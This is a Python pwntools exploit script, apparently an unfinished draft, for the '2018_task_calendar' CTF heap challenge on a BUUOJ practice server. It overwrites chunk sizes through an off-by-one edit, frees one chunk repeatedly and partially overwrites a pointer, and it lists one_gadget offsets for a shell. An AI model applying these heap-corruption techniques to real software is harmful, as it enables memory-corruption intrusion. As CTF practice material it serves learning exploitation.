#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./2018_task_calendar')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./2018_task_calendar')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			pop_rdx_rsi=0x00000000001306d9 #: pop rdx ; pop rsi ; ret
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',25977)
			elf=ELF('./2018_task_calendar')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			pop_rdx_rsi=0x00000000001306d9 #: pop rdx ; pop rsi ; ret
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		def add(a,b):
			io.sendlineafter('choice> ','1')
			io.sendlineafter('choice> ',str(a))
			io.sendlineafter('size> ',str(b))

		def edit(a,b,c):
			io.sendlineafter('choice> ','2')
			io.sendlineafter('choice> ',str(a))
			io.sendlineafter('size> ',str(b))
			io.sendafter('info> ',c)

		def delete(a):
			io.sendlineafter('choice> ','3')
			io.sendlineafter('choice> ',str(a))


		io.sendlineafter('input calendar name> ','keer')
		add(1,0x68)
		add(2,0x68)
		add(3,0x68)
		edit(1,0x68,'\x00'*0x68+'\xa1')
		edit(3,0x68,(p64(0)+p64(0x21))*6+'\n')
		for i in range(8):
			delete(2)
		edit(2,1,p64(0x8760)[:2])
		edit(1,0x68,'\x00'*0x68+'\x71')
		add(4,0x68)

		# success('libc_base:'+hex(libc_base))
		gdb.attach(io)
		pause()
		# success('heap_base:'+hex(heap_base))
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue